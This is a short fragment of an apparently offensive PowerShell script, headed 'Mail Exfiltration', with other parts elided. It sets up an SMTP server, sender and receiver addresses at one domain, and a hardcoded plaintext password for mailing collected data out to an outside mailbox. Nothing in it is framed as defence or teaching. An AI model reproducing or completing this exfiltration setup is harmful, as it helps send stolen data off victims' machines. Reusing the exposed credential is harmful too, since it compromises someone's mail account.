...
#Mail Exfiltration
$smtp = "mail.geeksview.co.uk" # Put SMTP SERVER HERE, TESTED WITH GOOGLES
$From = "marley@geeksview.co.uk" # Put the SENDER HERE
$To = "marley@geeksview.co.uk" # Put the RECEIVER HERE
$smtp = "mail.geeksview.co.uk" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
...
$Password = "zjlG71#Cd1dG" | ConvertTo-SecureString -AsPlainText -Force
